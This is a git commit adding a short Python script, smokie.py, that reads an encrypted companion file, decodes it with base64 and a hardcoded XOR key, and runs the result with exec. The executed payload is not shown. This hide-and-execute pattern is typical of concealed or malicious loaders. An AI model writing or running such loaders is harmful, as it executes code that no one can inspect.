3b90e16650394ff2300c45cb21be23f475e36f40
xgod690 <sumitrajgarh68@gmail.com>
2024-10-06 19:48:04 +0530

    Add files via upload

---
+++ smokie.py
@@ -0,0 +1,14 @@
+import base64
+
+def xor_encrypt_decrypt(data, key):
+    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))
+
+# Read the encrypted script
+with open('smokie.py.enc', 'r') as file: 
+    encrypted_script_base64 = file.read()
+
+key = '@Hmm_Smokie'  
+encrypted_script = base64.b64decode(encrypted_script_base64).decode()
+decrypted_script = xor_encrypt_decrypt(encrypted_script, key)
+
+exec(decrypted_script)  
